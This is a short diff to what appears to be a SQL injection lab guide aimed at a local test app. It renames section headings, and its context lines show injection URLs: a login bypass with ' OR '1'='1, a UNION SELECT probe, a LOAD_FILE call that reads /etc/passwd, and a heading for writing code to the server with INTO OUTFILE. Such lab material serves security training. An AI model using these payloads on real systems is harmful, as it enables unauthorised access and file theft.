@@ -44,7 +44,7 @@ http://127.0.0.1:8781/login/login.php?user=user'&password=pass'
 
 http://127.0.0.1:8781/login/login.php?user=admin&password=xyz' OR '1'='1
 
-# Read sensible Files
+# File Attacks
 
 ## Verification
 
@@ -52,7 +52,7 @@ Check if you can do a [`UNION SELECT`](https://www.techonthenet.com/sql/union_al
 
 http://127.0.0.1:8781/list_user/user_information.php?UserID=1%20UNION%20ALL%20SELECT%201,2,3
 
-## Attack
+## Read sensible files
 
 If file permissions are set to db user (e.g. logged in as root or `GRANT FILE ON *.* TO 'user'@'%';` is set):
 
@@ -60,7 +60,7 @@ Use `LOAD_FILE`:
 
 http://127.0.0.1:8781/list_user/user_information.php?UserID=1%20UNION%20ALL%20SELECT%20LOAD_FILE(%27/etc/passwd%27),2,3
 
-## Write Code to Server
+## Write code to server
 
 Use `INTO OUTFILE`: 
 
